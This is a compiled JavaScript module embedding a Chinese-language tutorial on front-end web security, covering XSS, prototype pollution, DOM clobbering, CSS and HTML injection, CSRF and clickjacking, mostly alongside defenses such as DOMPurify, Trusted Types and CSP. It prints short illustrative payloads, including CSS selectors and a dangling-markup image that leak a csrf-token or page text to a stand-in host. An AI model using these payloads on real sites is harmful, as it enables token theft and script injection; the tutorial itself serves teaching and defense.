import{o as a,f as n,N as o}from"./vendor-KON_WPKK.js";const l={class:"markdown-body"},i=o(`<h2>前端安全</h2><p>参考 <a href="https://aszx87410.github.io/beyond-xss" target="_blank" rel="noopener">https://aszx87410.github.io/beyond-xss</a></p><h3>XSS跨站脚本攻击</h3><p>XSS （cross-site-scripting）是最常见的前端（web）攻击手段，虽然名字中有跨站，但实际上只要在网页中执行了任意不在期望范围内的脚本的行为都属于XSS的范畴</p><h4>XSS分类</h4><ol><li>反射型，通常构造恶意的url来触发，如果代码中读取了url中的值就有可能会触发</li><li>持久性，通常是服务器接收到了恶意输入并且存储起来，在后续请求中仍然有可能传送给用户，这种方式的XSS影响范围广危害性大</li><li>DOM型，通常是前端脚本接收了一些恶意的输入导致页面DOM发生改变，触发脚本执行</li></ol><p>除此之外，还有一些更厉害的脚本攻击，它们利用的不是网页的漏洞而是浏览器本身及其插件的漏洞，被称为 Universal XSS。</p><h4>如何执行脚本</h4><ol><li><p>通过<code>&lt;script&gt;</code>标签 直接通过 <code>innerHTML</code>来注入<code>&lt;script&gt;</code>标签并不会生效，但是下面这种方式就可以：<code>document.body.innerHTML = &#39;&lt;iframe srcdoc=&quot;&amp;lt;script&gt;alert(1)&amp;lt;/script&gt;&quot;&gt;&lt;/iframe&gt;&#39;</code></p></li><li><p>通过内联事件，例如<code>onload</code>, <code>onanmiationstart</code>…等</p></li><li><p>通过<code>javascript:</code>伪协议（包括<code>data:</code>）</p><ul><li>JavaScript伪协议可以用于<code>src</code>,<code>href</code>,<code>action</code>,<code>formaction</code>等很多接收地址的地方，例如Vue的文章关于安全这一块就指出了<a href="https://vuejs.org/guide/best-practices/security.html#potential-dangers" target="_blank" rel="noopener">相关例子</a></li><li>另一个有风险的地方是在页面跳转的时候，例如<code>window.location = &#39;javascript:alert(1)&#39;</code>，攻击者可以在窃取信息之后再做正常跳转</li></ul><p>所以在涉及到url注入的地方一定要小心，可以借助<a href="https://github.com/braintree/sanitize-url" target="_blank" rel="noopener">sanitize-url</a>来过滤掉伪协议；处理URL的时候使用<code>new URL</code>的方式而不是自己处理</p></li></ol><p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" rel="noopener">这个站点</a>总结了相当多的构造方式，并且得益于JavaScript的灵活性，你可以通过Unicode编码、URL编码、HTML实体编码、动态构造等多种手段来装饰XSS注入内容</p><h4>如何防范</h4><ol><li><p>最基本也最重要的方法就是对用户输入进行<strong>编码</strong>和<strong>过滤</strong><strong>前后端都需要</strong>使用可靠的第三方库对用户的所有可能的输入以及后端的输出进行编码和过滤（实际上有时碍于业务限制无法对输入进行彻底的编码，这样会损失原始信息），例如<a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noopener">DOMPurify</a>，并且要用正确的使用方式（配置正确的选项）以及避免对已经过滤的结果再做处理。</p><p>浏览器也推出了类似的API（不稳定）：<a href="https://developer.mozilla.org/en-US/docs/Web/API/Sanitizer" target="_blank" rel="noopener">Sanitizer</a>，它的过滤更加苛刻。</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API" target="_blank" rel="noopener">Trusted Types</a>可以增加诸如<code>innerHTML</code>, <code>document.write</code>, <code>insertAdjacentHTML</code>等方式的安全性。需要在CSP中启用相关策略之后，这些有风险的API就无法接收字符串作为输入而是需要 <code>TrustedHTML</code> 类型的数据。</p><p>经过可信的三方库编码之后的结果也并不是完全可信的，有一类针对sanitizer的攻击叫做mutation based XSS，原理大概是字符串的html被插入到真实dom之后的结构并非一定跟字符串呈现的结构一致，也就是需要遵循html的解析规范，这就会导致sanitizer相关的库基于字符串解析判断是安全的内容有可能在浏览器那里变成可能的XSS攻击</p><p>另外程序使用的数据来源不只是来自用户输入，一些敏感的属性同样要警惕使用，例如<code>window.name</code>, <code>window.location</code>, <code>document.URL</code>, <code>document.referrer</code>等等，并且严禁使用动态执行，如<code>eval</code>, <code>setTimeout(string)</code>, <code>new Function</code>等</p></li><li><p>启用 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank" rel="noopener">CSP</a> CSP（<a href="https://content-security-policy.com/" target="_blank" rel="noopener">Content Security Policy</a>）可以对浏览器可以执行什么以及资源来源进行限制。CSP可以通过http header或者使用meta标签（有限制）进行设置。CSP具备一定的实施成本，因为它的策略相当多并且还处于不断完善的过程中，如果配置不完善或者不经常维护和测试也容易留下可以绕过的漏洞，或者对页面运行产生影响。</p></li><li><p>增加XSS的后序攻击成本 通常来讲XSS是攻击的前序步骤，假设XSS攻击已经发生，我们仍然可以增加其他方面的安全性来降低XSS的风险。例如增加验证的步骤或难度，安全的存储token，后端限制token的有效范围、期限等</p></li></ol><h3>原型链污染</h3><p>JavaScript代码一般都是源码分发，攻击者可以找出能够污染原型的地方，从而达到攻击的目的。</p><p>举个例子：</p><pre class="shiki shiki-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8;" tabindex="0"><code class="language-js"><span class="line"><span style="color:#D73A49;--shiki-dark:#F97583;">function</span><span style="color:#6F42C1;--shiki-dark:#B392F0;"> handleMessage</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="color:#E36209;--shiki-dark:#FFAB70;">event</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">) {</span></span>
<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583;">  const</span><span style="color:#24292E;--shiki-dark:#E1E4E8;"> { </span><span style="color:#005CC5;--shiki-dark:#79B8FF;">x</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="color:#005CC5;--shiki-dark:#79B8FF;">y</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="color:#005CC5;--shiki-dark:#79B8FF;">color</span><span style="color:#24292E;--shiki-dark:#E1E4E8;"> } </span><span style="color:#D73A49;--shiki-dark:#F97583;">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8;"> event.data</span></span>
<span class="line"><span style="color:#6A737D;--shiki-dark:#6A737D;">  // 构造消息：\`data: { y: &#39;__proto__&#39;, x: &#39;html&#39;, color: true } \`</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">  screen[y][x] </span><span style="color:#D73A49;--shiki-dark:#F97583;">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8;"> color</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">}</span></span>
<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583;">function</span><span style="color:#6F42C1;--shiki-dark:#B392F0;"> createElement</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="color:#E36209;--shiki-dark:#FFAB70;">config</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">) {</span></span>
<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583;">  const</span><span style="color:#005CC5;--shiki-dark:#79B8FF;"> element</span><span style="color:#D73A49;--shiki-dark:#F97583;"> =</span><span style="color:#24292E;--shiki-dark:#E1E4E8;"> document.</span><span style="color:#6F42C1;--shiki-dark:#B392F0;">createElement</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">(config.tag)</span></span>
<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583;">  if</span><span style="color:#24292E;--shiki-dark:#E1E4E8;"> (config.html) {</span></span>
<span class="line"><span style="color:#6A737D;--shiki-dark:#6A737D;">    // 这样这里的if总是为true，就会执行innerHTML操作</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">    element.innerHTML </span><span style="color:#D73A49;--shiki-dark:#F97583;">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8;"> config.content</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">  } </span><span style="color:#D73A49;--shiki-dark:#F97583;">else</span><span style="color:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">    element.innerText </span><span style="color:#D73A49;--shiki-dark:#F97583;">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8;"> config.content</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">  }</span></span>
<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583;">  return</span><span style="color:#24292E;--shiki-dark:#E1E4E8;"> element</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">}</span></span></code></pre><h3>DOM clobbering</h3><p>这种攻击的原理就是如果存在带有id的dom，那么window上面也会有id同名的属性，这样就有可能影响到JavaScript代码。下面几种式也都可以创建全局变量，并且也会在<code>document</code>上创建相同的属性：</p><pre class="shiki shiki-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8;" tabindex="0"><code class="language-html"><span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="color:#22863A;--shiki-dark:#85E89D;">embed</span><span style="color:#6F42C1;--shiki-dark:#B392F0;"> name</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="color:#032F62;--shiki-dark:#9ECBFF;">&quot;b&quot;</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">&gt;&lt;/</span><span style="color:#B31D28;--shiki-dark:#FDAEB7;font-style:italic;--shiki-dark-font-style:italic;">embed</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="color:#22863A;--shiki-dark:#85E89D;">form</span><span style="color:#6F42C1;--shiki-dark:#B392F0;"> name</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="color:#032F62;--shiki-dark:#9ECBFF;">&quot;c&quot;</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">&gt;&lt;/</span><span style="color:#22863A;--shiki-dark:#85E89D;">form</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="color:#22863A;--shiki-dark:#85E89D;">img</span><span style="color:#6F42C1;--shiki-dark:#B392F0;"> name</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="color:#032F62;--shiki-dark:#9ECBFF;">&quot;d&quot;</span><span style="color:#24292E;--shiki-dark:#E1E4E8;"> /&gt;</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="color:#22863A;--shiki-dark:#85E89D;">object</span><span style="color:#6F42C1;--shiki-dark:#B392F0;"> name</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="color:#032F62;--shiki-dark:#9ECBFF;">&quot;e&quot;</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">&gt;&lt;/</span><span style="color:#22863A;--shiki-dark:#85E89D;">object</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="color:#22863A;--shiki-dark:#85E89D;">iframe</span><span style="color:#6F42C1;--shiki-dark:#B392F0;"> name</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="color:#032F62;--shiki-dark:#9ECBFF;">&quot;f&quot;</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">&gt;&lt;/</span><span style="color:#22863A;--shiki-dark:#85E89D;">iframe</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre><p>例如</p><pre class="shiki shiki-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8;" tabindex="0"><code class="language-html"><span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="color:#22863A;--shiki-dark:#85E89D;">form</span><span style="color:#6F42C1;--shiki-dark:#B392F0;"> id</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="color:#032F62;--shiki-dark:#9ECBFF;">&quot;config&quot;</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">  &lt;</span><span style="color:#22863A;--shiki-dark:#85E89D;">input</span><span style="color:#6F42C1;--shiki-dark:#B392F0;"> name</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="color:#032F62;--shiki-dark:#9ECBFF;">&quot;env&quot;</span><span style="color:#6F42C1;--shiki-dark:#B392F0;"> value</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="color:#032F62;--shiki-dark:#9ECBFF;">&quot;test&quot;</span><span style="color:#24292E;--shiki-dark:#E1E4E8;"> /&gt;</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="color:#22863A;--shiki-dark:#85E89D;">form</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="color:#22863A;--shiki-dark:#85E89D;">script</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583;">  if</span><span style="color:#24292E;--shiki-dark:#E1E4E8;"> (config.env.value </span><span style="color:#D73A49;--shiki-dark:#F97583;">===</span><span style="color:#032F62;--shiki-dark:#9ECBFF;"> &#39;test&#39;</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">) {</span></span>
<span class="line"><span style="color:#6A737D;--shiki-dark:#6A737D;">    // 会触发此处逻辑</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">  }</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="color:#22863A;--shiki-dark:#85E89D;">script</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre><p><a href="https://splitline.github.io/DOM-Clobber3r/" target="_blank" rel="noopener">这个工具</a>可以帮你构造多层属性访问的html</p><h3>模板注入</h3><p>模板引擎在前后端都有广泛的使用，它们的插值部分一般都支持动态执行一段语句，通过精心构造可以触发代码执行，这和SQL注入的原理是很像的，包括XSS本身也都主要依靠注入来实现</p><h3>CSS注入</h3><p>一般情况下，我们认为<code>style</code>标签是安全的，但是它也有泄露信息的可能，例如</p><pre class="shiki shiki-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8;" tabindex="0"><code class="language-css"><span class="line"><span style="color:#22863A;--shiki-dark:#85E89D;">input</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">[</span><span style="color:#6F42C1;--shiki-dark:#B392F0;">name</span><span style="color:#D73A49;--shiki-dark:#F97583;">=</span><span style="color:#032F62;--shiki-dark:#9ECBFF;">&quot;csrf-token&quot;</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">][</span><span style="color:#6F42C1;--shiki-dark:#B392F0;">value</span><span style="color:#D73A49;--shiki-dark:#F97583;">^=</span><span style="color:#032F62;--shiki-dark:#9ECBFF;">&quot;a&quot;</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">] {</span></span>
<span class="line"><span style="color:#005CC5;--shiki-dark:#79B8FF;">  background</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="color:#005CC5;--shiki-dark:#79B8FF;">url</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="color:#E36209;--shiki-dark:#FFAB70;">https://myserver.com?q=a</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#22863A;--shiki-dark:#85E89D;">input</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">[</span><span style="color:#6F42C1;--shiki-dark:#B392F0;">name</span><span style="color:#D73A49;--shiki-dark:#F97583;">=</span><span style="color:#032F62;--shiki-dark:#9ECBFF;">&quot;csrf-token&quot;</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">][</span><span style="color:#6F42C1;--shiki-dark:#B392F0;">value</span><span style="color:#D73A49;--shiki-dark:#F97583;">^=</span><span style="color:#032F62;--shiki-dark:#9ECBFF;">&quot;b&quot;</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">] {</span></span>
<span class="line"><span style="color:#005CC5;--shiki-dark:#79B8FF;">  background</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="color:#005CC5;--shiki-dark:#79B8FF;">url</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="color:#E36209;--shiki-dark:#FFAB70;">https://myserver.com?q=b</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#22863A;--shiki-dark:#85E89D;">input</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">[</span><span style="color:#6F42C1;--shiki-dark:#B392F0;">name</span><span style="color:#D73A49;--shiki-dark:#F97583;">=</span><span style="color:#032F62;--shiki-dark:#9ECBFF;">&quot;csrf-token&quot;</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">][</span><span style="color:#6F42C1;--shiki-dark:#B392F0;">value</span><span style="color:#D73A49;--shiki-dark:#F97583;">^=</span><span style="color:#032F62;--shiki-dark:#9ECBFF;">&quot;c&quot;</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">] {</span></span>
<span class="line"><span style="color:#005CC5;--shiki-dark:#79B8FF;">  background</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="color:#005CC5;--shiki-dark:#79B8FF;">url</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="color:#E36209;--shiki-dark:#FFAB70;">https://myserver.com?q=c</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">...</span></span>
<span class="line"></span></code></pre><p>另外可以利用<code>@import url()</code>，它可以动态引入css，并且可以嵌套（返回的css仍然可以用@import），这样的话我们可以等待第一个字符猜测命中后，再让服务器返回第二个字符猜测的css响应</p><p>除了这种方式之外，还有其他很tricky的方式让css命中背景图发送，例如：</p><pre class="shiki shiki-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8;" tabindex="0"><code class="language-css"><span class="line"><span style="color:#D73A49;--shiki-dark:#F97583;">@font-face</span><span style="color:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="color:#005CC5;--shiki-dark:#79B8FF;">  font-family</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="color:#032F62;--shiki-dark:#9ECBFF;">&#39;f1&#39;</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#005CC5;--shiki-dark:#79B8FF;">  src</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="color:#005CC5;--shiki-dark:#79B8FF;">url</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="color:#E36209;--shiki-dark:#FFAB70;">https://myserver.com?q=1</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#005CC5;--shiki-dark:#79B8FF;">  unicode-range</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="color:#005CC5;--shiki-dark:#79B8FF;">U+31</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">}</span></span></code></pre><p>css自定义字体中可以根据文本的字符范围<code>unicode-range</code>来请求不同的字体，这样我们可以猜测某个元素下大致的内容。 另外我们可以通过构造特定样式的字体文件，通过设置字体的尺寸让某些文字出现时出现滚动条，再设置滚动条出现时的背景图，也可以猜测文本内容。</p><h3>HTML注入</h3><p>如果我们有机会在页面上注入普通的html，那么就有机会模拟页面的某一部分来达到欺骗的目的。</p><p>另外也可以利用html解析规范的容错机制来构造请求，例如：</p><pre class="shiki shiki-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8;" tabindex="0"><code class="language-html"><span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="color:#22863A;--shiki-dark:#85E89D;">div</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">  Hello, </span><span style="color:#B31D28;--shiki-dark:#FDAEB7;font-style:italic;--shiki-dark-font-style:italic;">&lt;</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">?php echo $_GET[&#39;q&#39;]; ?&gt;</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">  &lt;</span><span style="color:#22863A;--shiki-dark:#85E89D;">div</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">&gt;Your account balance is: 1337&lt;/</span><span style="color:#22863A;--shiki-dark:#85E89D;">div</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">  &lt;</span><span style="color:#22863A;--shiki-dark:#85E89D;">footer</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">&gt;&lt;</span><span style="color:#22863A;--shiki-dark:#85E89D;">img</span><span style="color:#6F42C1;--shiki-dark:#B392F0;"> src</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="color:#032F62;--shiki-dark:#9ECBFF;">&quot;footer.png&quot;</span><span style="color:#24292E;--shiki-dark:#E1E4E8;"> /&gt;&lt;/</span><span style="color:#22863A;--shiki-dark:#85E89D;">footer</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="color:#22863A;--shiki-dark:#85E89D;">div</span><span style="color:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre><p>在PHP注入点传入<code>&lt;img src=&quot;http://example.com?q=</code>，这样账户余额都会成为图片src的一部分。（此例在chrome下已被修复）</p><h3>CSRF跨站请求伪造</h3><p>Cross-Site Request Forgery，在用户登录了某个网站之后，攻击者诱使用户做了一些操作，而这些操作触发了对已登录网站的请求，这里的请求是用户不知情发出的，这就是跨站请求伪造。</p><p>常见的防御手段：</p><ul><li>检查<code>Referer</code>和<code>Origin</code>，并且还加入一些自定义header做校验</li><li>对于敏感操作加入人机验证机制，如验证码</li><li>请求时携带上csrf token并需要后端校验</li><li>cookie-token双重验证，我们可以把同一份token在请求时添加到header中，同时在cookie中也注入相同的token，这样后端在收到请求时可以校验两个来源的token是否一致。这依赖于攻击者一般无法获取cookie这个前提。</li><li>使用JWT来做身份验证，它跟token的思想差不多，只不过它主要功能是用来验证用户身份，同时也可以有效避免CSRF攻击</li><li>SameSite cookie，现代浏览器都已经默认启用。<strong>即便如此上述的防御措施仍然是必要的。</strong></li></ul><h3>点击劫持</h3><p>这通常发生在恶意页面嵌入了正常页面，通过css等手段让正常页面不可见，但是仍然可以接收点击等事件，以此达到欺骗的目的。</p><p>防范点击劫持可以通过禁止自己的页面被嵌套，可以利用<code>top !== self</code>，或者设置<code>X-Frame-Options</code>，或者使用CSP的<code>frame-ancestors</code>指令等方式</p><p>另外对于重要敏感的操作，可以使用二次提示等方式增加点击劫持的难度</p><h3>资源嗅探攻击</h3><h3>供应链投毒</h3><h3>旁路攻击</h3>`,47),e=[i],E={__name:"前端安全",setup(p,{expose:s}){return s({frontmatter:{}}),(t,c)=>(a(),n("div",l,e))}};export{E as default};
